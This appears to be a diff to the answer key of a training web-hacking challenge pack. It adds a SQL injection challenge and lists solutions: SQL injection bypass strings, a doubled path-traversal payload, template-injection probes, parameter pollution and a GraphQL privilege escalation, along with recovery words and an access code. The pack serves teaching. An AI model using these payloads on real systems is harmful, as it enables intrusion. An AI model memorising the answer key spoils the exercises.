@@ -19,12 +19,13 @@
 | 8 | Verb Smuggle | Hard | `/challenge/verb-smuggle` | `lock_cleared` | DELETE clears lock |
 | 9 | Twin Param | Hard | `/challenge/twin-param` | `hpp_staff` | Dual role= bypass |
 | 10 | Graph Attic | Hard | `/challenge/graph-attic` | `attic_note` | elevate + atticNote |
-| 11 | Filter Crawl | Danger | `/challenge/filter-crawl` | `sealed_outside` | Escape brochure root |
-| 12 | Template Vault | Danger | `/challenge/template-vault` | `vault_line` | `{{ vault }}` renders |
+| 11 | Hidden Ledger | Hard | `/challenge/hidden-ledger` | `ledger_bypass_ok` | SQLi bypass + comment |
+| 12 | Filter Crawl | Danger | `/challenge/filter-crawl` | `sealed_outside` | Escape brochure root |
+| 13 | Template Vault | Danger | `/challenge/template-vault` | `vault_line` | `{{ vault }}` renders |
 
 **Submit:** recovery word in Answer box → personal `KGSP{…}`.
 
-**Friend TA ideas (cleaned into this pack):** Cookie Lounge, Hashed Dossier, Twin Param, Graph Attic, Template Vault.
+**Friend TA ideas (cleaned into this pack):** Cookie Lounge, Hashed Dossier, Twin Param, Graph Attic, Template Vault, Hidden Ledger.
 
 ---
 
@@ -76,14 +77,21 @@ URL: `?username=employee1&role=user&role=staff` → Apply.
 2. `mutation { setStaff(true) }` (lab accepts `setStaff(true)`).
 3. Query `atticNote` while staff.
 
+### 11 · Hidden Ledger · `ledger_bypass_ok`
+Simulated query: `WHERE acct = '<input>' AND closed = 0`
+1. `'` alone → `Database Syntax Error near '''`
+2. Random id → `Account not found.`
+3. `admin' OR '1'='1` alone → still not found (trailing `AND closed = 0`).
+4. Working: `x' OR '1'='1'--` or `x' OR 1=1--` (or `#` / `/*`).
+
 ---
 
 ## Danger
 
-### 11 · Filter Crawl · `sealed_outside`
+### 12 · Filter Crawl · `sealed_outside`
 Single `../` is stripped once. Use doubled form e.g. `....//sealed/note.txt` so after one strip a parent remains and normalizes to `/var/sealed/note.txt`.
 
-### 12 · Template Vault · `vault_line`
+### 13 · Template Vault · `vault_line`
 `{{7*7}}` → 49 proves eval. Shell gadgets denied. Use `{{ vault }}`.
 
 ---
@@ -91,5 +99,5 @@ Single `../` is stripped once. Use doubled form e.g. `....//sealed/note.txt` so 
 ## Ops
 
 - Day open + code `WEBHACK-2026`.
-- Frontend: `src/challenges/day8/*` · migration `20260714_1200_day8_webapp_hacking.sql`.
+- Frontend: `src/challenges/day8/*` · migrations `20260714_1200_day8_webapp_hacking.sql`, `20260714_1230_day8_hidden_ledger.sql`.
 - `vercel.json` sets `X-Desk-Ticket` on `/challenges/day8/ping.txt` (Vite middleware mirrors locally).
